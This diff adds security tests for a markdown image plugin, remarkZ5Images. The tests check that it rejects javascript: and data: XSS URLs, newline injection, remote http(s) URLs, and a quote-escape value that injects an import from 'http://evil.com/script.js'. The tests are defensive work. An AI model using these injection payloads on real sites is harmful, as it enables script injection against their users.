@@ -401,3 +401,101 @@ describe('remarkZ5Images HTML integration', () => {
 		expect(tree.children[1].type).toBe('paragraph');
 	});
 });
+
+describe('remarkZ5Images security', () => {
+	const processor = remark().use(remarkZ5Images);
+
+	it('should reject URLs with protocol schemes', async () => {
+		const markdown = `![Malicious](javascript:alert('xss')?z5)`;
+
+		const file = new VFile(markdown);
+		const tree = processor.parse(markdown);
+		await processor.run(tree, file);
+
+		// Should not create any Zone5 components or imports
+		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
+		expect(htmlNodes).toHaveLength(0);
+
+		const scriptNodes = tree.children
+			.filter<RootContentMap['raw']>((node: RootContent) => isRawNode(node))
+			.filter((node) => node.value.startsWith('<script'));
+		expect(scriptNodes).toHaveLength(0);
+	});
+
+	it('should reject URLs with data: scheme', async () => {
+		const markdown = `![Malicious](data:text/html,<script>alert('xss')</script>?z5)`;
+
+		const file = new VFile(markdown);
+		const tree = processor.parse(markdown);
+		await processor.run(tree, file);
+
+		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
+		expect(htmlNodes).toHaveLength(0);
+	});
+
+	it('should reject URLs with quotes that could escape import statement', async () => {
+		const markdown = `![Malicious](image'; import evil from 'http://evil.com/script.js?z5)`;
+
+		const file = new VFile(markdown);
+		const tree = processor.parse(markdown);
+		await processor.run(tree, file);
+
+		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
+		expect(htmlNodes).toHaveLength(0);
+	});
+
+	it('should reject URLs with newlines', async () => {
+		const markdown = `![Malicious](image.jpg
+malicious-code?z5)`;
+
+		const file = new VFile(markdown);
+		const tree = processor.parse(markdown);
+		await processor.run(tree, file);
+
+		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
+		expect(htmlNodes).toHaveLength(0);
+	});
+
+	it('should allow valid relative paths', async () => {
+		const markdown = `![Valid](./images/photo.jpg?z5)
+![Valid](../other/image.jpg?z5)
+![Valid](image.jpg?z5)`;
+
+		const file = new VFile(markdown);
+		const tree = processor.parse(markdown);
+		await processor.run(tree, file);
+
+		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
+		expect(htmlNodes).toHaveLength(1);
+
+		const scriptNodes = tree.children
+			.filter<RootContentMap['raw']>((node: RootContent) => isRawNode(node))
+			.filter((node) => node.value.startsWith('<script'));
+		expect(scriptNodes).toHaveLength(1);
+		expect(scriptNodes[0].value).toContain('./images/photo.jpg?z5');
+		expect(scriptNodes[0].value).toContain('../other/image.jpg?z5');
+		expect(scriptNodes[0].value).toContain('image.jpg?z5');
+	});
+
+	it('should reject http:// URLs', async () => {
+		const markdown = `![Remote](http://example.com/image.jpg?z5)`;
+
+		const file = new VFile(markdown);
+		const tree = processor.parse(markdown);
+		await processor.run(tree, file);
+
+		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
+		expect(htmlNodes).toHaveLength(0);
+	});
+
+	it('should reject https:// URLs', async () => {
+		const markdown = `![Remote](https://example.com/image.jpg?z5)`;
+
+		const file = new VFile(markdown);
+		const tree = processor.parse(markdown);
+		await processor.run(tree, file);
+
+		const htmlNodes = tree.children.filter((node: Node) => node.type === 'html');
+		expect(htmlNodes).toHaveLength(0);
+	});
+});
